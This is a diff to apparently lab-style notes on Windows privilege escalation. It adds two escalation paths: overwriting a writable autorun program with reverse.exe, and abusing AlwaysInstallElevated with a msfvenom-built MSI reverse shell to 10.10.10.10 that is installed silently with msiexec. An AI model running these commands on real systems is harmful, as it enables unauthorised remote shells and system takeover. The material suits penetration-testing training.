@@ -155,8 +155,10 @@ Start a listener on Kali and then start the service to spawn a reverse shell run
 
 > **net start unquotedsvc**
 
+  
 
-   
+
+
 
 
 
@@ -188,10 +190,10 @@ Start a listener on Kali and then start the service to spawn a reverse shell run
 **Step 4:** Listen on Netcat after starting the service
 
 > **net start regsvc**
-
-
-
-
+  
+  
+  
+  
 
 
 ### Escalation Path 5 - Insecure Service Executables
@@ -219,6 +221,63 @@ Start a listener on Kali and then start the service to spawn a reverse shell run
 **Step 4:** Start a listener and initiate the service
 
 > **net start filepermsvc**
+
+ 
+
+
+
+
+### Escalation Path 6 - Registry Autoruns
+-------------------------------------------
+
+  
+**Step 1:** Query the registry for AutoRun executables
+  
+> **reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run**
+
+
+
+**Step 2:** Using Accesschk.exe for ascertaining whether any autorun file is writable by all users (in this case it is program.exe)
+
+
+> **C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"**
+
+
+**Step 3:** Copy the reverse.exe into the folder where the current writable autorun file exists and **"overwrite"** it with reverse.exe
+
+> **copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y**
+
+
+**Step 4:** Restart the box (if this is possible in the scenario provided and then wait for someone to log in!!)
+
+
+
+
+### Escalation Path 7 - Registry (AllAlwaysInstallElevated)
+
+
+**Step 1:** Query the Registry for AlwaysInstallElevated keys
+
+> **reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated**
+> **reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated**
+
+
+**Step 2:** Note that both keys are set to 1 (0x01)
+
+
+
+**Step 3:** On Kali generate a msi based reverse shell file using
+
+> ** msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=1234 -f msi -o reverse.msi**
+
+
+**Step 4:** Transfer this reverse.msi file onto the Windows box
+
+
+
+**Step 5:** Start a listener on Kali and then run the installer to trigger the reverse shell
+
+> **msiexec /quiet /qn /i C:\PrivEsc\reverse.msi**
 
 
 
